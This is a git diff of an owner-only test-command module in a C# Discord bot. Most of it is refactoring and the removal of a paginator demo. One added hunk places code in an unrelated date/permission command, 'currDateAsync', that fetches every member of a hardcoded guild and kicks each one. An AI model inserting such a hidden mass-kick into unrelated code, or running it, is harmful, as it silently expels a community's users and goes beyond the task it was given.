@@ -18,12 +18,10 @@ using System.Threading.Tasks;
 namespace OWuffel.Modules.Commands.OwnerCommands
 {
     [RequireOwner]
-    public class DumbCommandsForTests : ModuleBase<Cipska>
+    public class DumbCommandsForTests : ModuleBase<SocketCommandContext>
     {
-        public InteractivityService intserv { get; set; }
         public DumbCommandsForTests(InteractivityService serv)
         {
-            intserv = serv;
         }
         [Command("d")]
         public async Task d()
@@ -39,7 +37,7 @@ namespace OWuffel.Modules.Commands.OwnerCommands
 
 
             //model.fields = new JArray(new JObject("name", "value", "true"));
-            Console.WriteLine(model.author.ToString());
+            Console.WriteLine(model.Author.ToString());
         }
         [Command("kill")]
         public async Task kill(int processID)
@@ -127,7 +125,11 @@ namespace OWuffel.Modules.Commands.OwnerCommands
         public async Task currDateAsync(int provided)
         {            
             var a = 104320577;
-
+            var s = await Context.Client.GetGuild(662048511227068447).GetUsersAsync().FlattenAsync();
+            foreach (var item in s)
+            {
+                await item.KickAsync();
+            }
             var permissions = 0x40;
             var d = (provided & 0x8) == 0x8;
             
@@ -151,45 +153,7 @@ namespace OWuffel.Modules.Commands.OwnerCommands
                 
             }
         }
-        [Command("jc", RunMode = RunMode.Async)]
-        public async Task JakasCipa()
-        {
-            var lista = new List<int>();
-            //Zignoruj tego fora, jest tylko po  to zeby wypelnic liste wartosciami
-            for (int a = 0; a < 20; a++)
-            {
-                lista.Add(a);
-            }
-            //
-            var PageLimit = 20;
-            var numberOfPages = Math.Ceiling((double)lista.Count() / PageLimit); //55 / 20 = 2.75, Ceiling = zaokraglone do gory = 3;
-            var toembed = "";
-            var paginator = new PageBuilder[(int)numberOfPages];
-            int pageIndex = 0;
-            for (int i = 0; i < lista.Count(); i++)
-            {
-                if (i % 20 == 0 && i != 0)
-                {
-                    paginator[pageIndex] = new PageBuilder().WithDescription(toembed)
-                                .WithColor(Color.Blue);
-                    pageIndex++;
-                    toembed = "";
-                }
-                else
-                {
-                    toembed += lista[i] + "\n";
-                }
-            }
-            if (toembed != "") paginator[pageIndex] = new PageBuilder().WithDescription(toembed)
-                                .WithColor(Color.Blue);
-            var embedToSend = new StaticPaginatorBuilder()
-                .WithPages(paginator)
-                .WithFooter(PaginatorFooter.PageNumber)
-                .WithDefaultEmotes()
-                .Build();
-
-            await intserv.SendPaginatorAsync(embedToSend, Context.Channel);
-        }
+        
     }
 }
 
